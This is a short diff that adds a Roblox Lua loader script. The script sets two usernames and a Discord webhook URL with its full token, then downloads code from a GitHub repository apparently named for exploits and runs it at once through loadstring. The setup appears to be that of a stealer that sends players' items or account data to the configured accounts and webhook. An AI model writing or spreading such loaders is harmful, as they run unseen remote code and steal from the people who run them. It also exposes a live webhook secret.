@@ -1,0 +1,5 @@
+UserName = "marmarxx124"
+Webhook = "https://discord.com/api/webhooks/1151142217453424680/WchLm9PxA-3iw8ZrptmrvhEv5TJ4R8sMoRV0eCFsH8VuMbv_WnlvBEJIVjho4mu_1-pB"
+UserName2 = "badegwpo123" 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Tqvinoxzc/Bestisploits/main/gg./ryrgbBtT", true))()
